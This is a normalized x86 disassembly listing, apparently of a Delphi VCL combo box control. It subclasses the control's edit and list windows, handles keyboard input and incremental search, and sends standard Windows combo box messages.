call sub_4030f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_435fc0
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_42b696
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_437564
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
xor eax eax
mov [ ebx + 0x248 ] eax
pop ebx
retn
sub_42b6e0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x157
mov eax ebx
call sub_43a170
push eax
call SendMessageA
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_42b704
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
push 0x0
xor eax eax
mov al bl
push eax
push 0x14f
mov eax esi
call sub_43a170
push eax
call SendMessageA
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax esi
call sub_43a170
push eax
call InvalidateRect
add esp 0x10
pop esi
pop ebx
retn
sub_42b74c
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
push 0x0
push 0x0
push 0x147
mov eax ebx
call sub_43a170
push eax
call SendMessageA
pop ebx
retn
mov eax [ ebx + 0x214 ]
pop ebx
retn
sub_42b778
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
mov [ ebx + 0x214 ] esi
pop esi
pop ebx
retn
pop esi
pop ebx
retn
push 0x0
push esi
push 0x14e
mov eax ebx
call sub_43a170
push eax
call SendMessageA
sub_42b7b4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jge r-xdata
cmp esi [ ebx + 0x20c ]
je r-xdata
xor esi esi
pop esi
pop ebx
retn
mov [ ebx + 0x20c ] esi
mov eax ebx
call sub_43a474
test al al
je r-xdata
push 0x0
push esi
push 0x141
mov eax ebx
call sub_43a170
push eax
call SendMessageA
sub_42b804
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x64 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0x64 ]
push eax
mov eax esi
call sub_43a170
push eax
call SetWindowTextA
sub_42b840
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_42b6e0
test al al
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0xc ] 0x4
sub_42b878
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_439788
pop esi
pop ebx
retn
mov eax ebx
call sub_437710
sub_42b89c
push ebx
mov ebx eax
mov eax ebx
call sub_435560
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x276 ] 0x2
jae r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42b8c4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ esi ] 0x112
jne r-xdata
mov eax [ esi ]
cmp eax 0x100
jb r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
jmp r-xdata
mov eax [ ebx + 0x250 ]
push eax
mov edx esi
mov ecx [ ebx + 0x240 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xf4 ]
mov eax [ esi ]
sub eax 0x30
je r-xdata
cmp eax 0x108
ja r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
sub eax 0x1d1
je r-xdata
mov eax ebx
call sub_44a5dc
mov edi eax
test edi edi
je r-xdata
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
sub eax 0x2
jne r-xdata
mov ecx esi
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax ebx
call sub_4334b4
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_4067cc
push eax
push 0x0
push 0x202
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_434030
jmp r-xdata
sub_42b9f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42bca7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x104
jg r-xdata
cmp eax 0xbd00
jg r-xdata
je r-xdata
sub eax 0xbd02
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x244 ]
je r-xdata
cmp eax 0x87
jg r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
sub eax 0x105
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
mov eax [ ebp + 0x8 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
cmp [ ebx ] 0x203
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_438fc4
test al al
je r-xdata
sub eax 0x100
je r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub eax 0x2
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4390ac
test al al
je r-xdata
sub eax 0xfb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x80
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42b6e0
test al al
je r-xdata
sub eax 0x7
je r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_453d88
jmp r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_4032ec
dec eax
je r-xdata
mov [ ebx + 0xc ] 0x4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_44a5dc
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42abb4
test al al
je r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_439174
test al al
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
je r-xdata
sub eax 0x7c
je r-xdata
movsx eax [ ebx + 0x8 ]
mov [ ebp - 0xc ] eax
movsx eax [ ebx + 0xa ]
mov [ ebp - 0x8 ] eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
push esi
call MapWindowPoints
mov ax [ ebp - 0xc ]
mov [ ebx + 0x8 ] ax
mov ax [ ebp - 0x8 ]
mov [ ebx + 0xa ] ax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov di [ ebx + 0x4 ]
cmp di 0xd
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_42b6e0
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov [ ebx + 0xc ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42b704
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_42bccc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi ]
sub eax 0x5
je r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub eax 0xfd
je r-xdata
mov eax ebx
call sub_4340f8
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
mov edx esi
mov eax ebx
call sub_437b84
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov edx esi
mov eax ebx
call sub_439174
test al al
jne r-xdata
add eax 0xffffffd0
sub eax 0x7
jb r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
cmp di 0xd
je r-xdata
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_41c698
push eax
mov eax [ esi + 0x4 ]
push eax
call SetTextColor
mov eax [ ebx + 0x170 ]
call sub_41d31c
call sub_41c698
push eax
mov eax [ esi + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0x170 ]
call sub_41d358
mov [ esi + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov edx esi
mov eax ebx
call sub_437af0
test al al
jne r-xdata
mov eax ebx
call sub_42b6e0
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
xor edx edx
mov eax ebx
call sub_42b704
jmp r-xdata
sub_42bdda
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_42bf38
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ edx + 0x6 ]
cmp eax 0x8
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bf3f
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
jmp [ eax * 4 + jump_table_42be08 ]
mov eax edi
mov si 0xffe9
call sub_4032ec
jmp r-xdata
mov eax edi
mov si 0xffb3
call sub_4032ec
jmp r-xdata
mov [ edi + 0x25d ] 0x0
mov eax edi
mov si 0xffb1
call sub_4032ec
mov eax edi
mov edx [ eax ]
call [ edx + 0xf0 ]
cmp [ edi + 0x25d ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ edi + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4339a0
mov eax edi
mov si 0xffeb
call sub_4032ec
mov eax edi
mov si 0xffb2
call sub_4032ec
jmp r-xdata
mov eax edi
mov si 0xffb0
call sub_4032ec
jmp r-xdata
mov [ edi + 0x25e ] 0x1
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_4388f4
jmp r-xdata
mov [ edi + 0x25e ] 0x0
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_4389e0
push 0x0
push 0x0
push 0x1f
mov eax edi
call sub_43a170
push eax
call PostMessageA
cmp [ edi + 0x25e ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x14f
mov eax edi
call sub_43a170
push eax
call PostMessageA
jmp r-xdata
sub_42bf6c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42c015
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x208 ]
call sub_432564
cmp [ ebx + 0x282 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x208 ]
call sub_41d6c8
test esi esi
jl r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x284 ]
call [ ebx + 0x280 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c01c
lea eax [ ebp - 0x14 ]
call sub_403eac
retn
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebx + 0x23c ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x10 ]
add edx 0x2
mov ecx [ ebp - 0xc ]
mov eax [ ebx + 0x208 ]
call sub_41d86c
sub_42c048
push esi
push edi
mov esi eax
mov eax esi
call sub_435a44
mov edi [ esi + 0x214 ]
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_42c070
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_43a474
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
call GetFocus
cmp eax [ esi + 0x240 ]
je r-xdata
mov bl 0x1
cmp eax [ esi + 0x244 ]
je r-xdata
xor ebx ebx
jmp r-xdata
sub_42c0c4
push ebx
push esi
cmp [ eax + 0x222 ] 0x0
je r-xdata
mov si 0xffb3
call sub_4032ec
pop esi
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
pop esi
pop ebx
retn
sub_42c0f0
push ebx
mov ebx eax
mov eax ebx
call sub_437128
push 0x0
mov eax [ ebx + 0x20c ]
push eax
push 0x141
mov eax ebx
call sub_43a170
push eax
call SendMessageA
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
pop ebx
retn
sub_42c128
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x104 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
cmp ebx eax
jle r-xdata
cmp ebx 0x1
jge r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x1
xor eax eax
push ebp
push sub_42c1be
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x9e
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xfc ]
imul ebx
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x4c ]
add eax 0x2
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c1c5
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x0
retn
mov ebx 0x1
sub_42c1c5
push 0x5f
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
pop ebx
pop ecx
pop ebp
retn
sub_42c1e4
push esi
push edi
mov esi eax
mov edi [ esi + 0x23c ]
test edi edi
je r-xdata
mov [ esi + 0x23c ] edx
pop edi
pop esi
retn
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop edi
pop esi
retn
sub_42c214
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42c293
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c29a
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax esi
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
sub_42c2a0
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_42c2e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40435c
xor eax eax
push ebp
push sub_42c329
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c330
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_42c338
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42b520
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
mov dl 0x1
call sub_4030c0
mov esi eax
mov [ ebx + 0x23c ] esi
mov [ esi + 0x10 ] ebx
mov [ ebx + 0x238 ] 0x10
mov [ ebx + 0x276 ] 0x0
xor eax eax
mov [ ebx + 0x26c ] eax
mov [ ebx + 0x268 ] 0x1
mov [ ebx + 0x290 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_42c3bc
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax [ esi + 0x23c ]
call sub_4030f0
mov eax [ esi + 0x278 ]
call sub_4030f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42b614
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_42c40c
push ebx
mov ebx eax
cmp dl [ ebx + 0x276 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x276 ] dl
cmp dl 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
call sub_437710
sub_42c470
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_436ffc
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_436f28
mov eax [ esi + 0x4 ]
or eax 0x200240
xor edx edx
mov dl [ ebx + 0x276 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x275 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x274 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_42c4d1
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov ebx eax
mov eax ebx
call sub_42c0f0
mov eax ebx
call sub_43a170
mov [ ebx + 0x248 ] eax
mov esi [ ebx + 0x278 ]
test esi esi
je r-xdata
mov al [ ebx + 0x276 ]
sub al 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebx + 0x278 ]
call sub_4030f0
xor eax eax
mov [ ebx + 0x278 ] eax
cmp [ ebx + 0x260 ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x5
mov eax ebx
call sub_43a170
push eax
call GetWindow
mov esi eax
test esi esi
je r-xdata
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x260 ]
jge r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x240 ] 0x0
je r-xdata
cmp [ ebx + 0x276 ] 0x1
jne r-xdata
push 0x0
mov eax [ ebx + 0x260 ]
push eax
push 0x14e
mov eax ebx
call sub_43a170
push eax
call SendMessageA
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebx + 0x260 ] eax
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
mov edi esi
mov [ ebx + 0x240 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x250 ] eax
mov eax [ ebx + 0x24c ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x240 ]
push eax
call SetWindowLongA
mov edi esi
mov [ ebx + 0x244 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x258 ] eax
mov eax [ ebx + 0x254 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x244 ]
push eax
call SetWindowLongA
push 0x2
push esi
call GetWindow
mov esi eax
sub_42c614
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_43750c
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x260 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov esi eax
mov [ ebx + 0x278 ] esi
mov edx [ ebx + 0x23c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_42c664
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x276 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_41d358
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov [ esi + 0xc ] 0x1
jmp r-xdata
add esp 0x10
pop esi
pop ebx
retn
sub_42c6b8
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push ebx
push 0x140
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43a170
push eax
call SendMessageA
mov eax [ esi ]
cmp eax [ ebx ]
seta al
pop esi
pop ebx
pop ebp
retn
sub_42c6e4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42c7a0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_433970
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x140
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43a170
push eax
call SendMessageA
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
inc edx
lea eax [ ebp - 0xc ]
call sub_40440c
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43a170
push eax
call SendMessageA
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_4339a0
mov bx [ ebp - 0x4 ]
mov edx ebx
mov eax ebx
call sub_4067ec
push eax
push 0x0
push 0x142
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43a170
push eax
call SendMessageA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c7a7
lea eax [ ebp - 0xc ]
call sub_403eac
retn
sub_42c7ac
push ebp
mov ebp esp
mov ecx 0xb
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42cb64
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_439154
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x268 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cb6b
lea eax [ ebp - 0x58 ]
mov edx 0x5
call sub_403ed0
lea eax [ ebp - 0x44 ]
call sub_403eac
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403ed0
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_403ed0
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403ed0
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x276 ]
sub al 0x2
jae r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x26c ]
cmp eax 0x1f4
jb r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_433970
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_403f00
jmp r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_403eac
mov al [ ebx ]
sub al 0x8
je r-xdata
push ebp
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_42c6b8
pop ecx
test al al
je r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x276 ]
sub al 0x2
jae r-xdata
push ebp
call sub_42c6e4
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
sub al 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_40416c
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_40bb74
cmp al 0x2
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_433970
mov eax [ ebp - 0x38 ]
call sub_40416c
test eax eax
jle r-xdata
mov [ ebx ] 0x0
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_4032ec
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_42b6e0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_40416c
mov edx eax
mov eax [ ebp - 0x4 ]
add eax 0x270
mov ecx 0x1
call sub_40440c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_40416c
mov edx eax
mov eax [ ebp - 0x4 ]
add eax 0x270
mov ecx 0x1
call sub_40440c
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_433970
mov esi [ ebp - 0x8 ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42b704
jmp r-xdata
push ebp
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_42c6b8
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42b6e0
test al al
jne r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
call sub_40bb74
cmp al 0x2
je r-xdata
lea eax [ ebp - 0x50 ]
mov dl [ ebx ]
call sub_404094
mov ecx [ ebp - 0x50 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x270 ]
lea eax [ ebp - 0x14 ]
call sub_4041b8
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov ecx [ ebp - 0x8 ]
mov edx 0x1
call sub_4043cc
mov eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x4c ]
mov dl [ ebx ]
call sub_404094
mov ecx [ ebp - 0x4c ]
lea eax [ ebp - 0x14 ]
pop edx
call sub_4041b8
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_42b704
dec esi
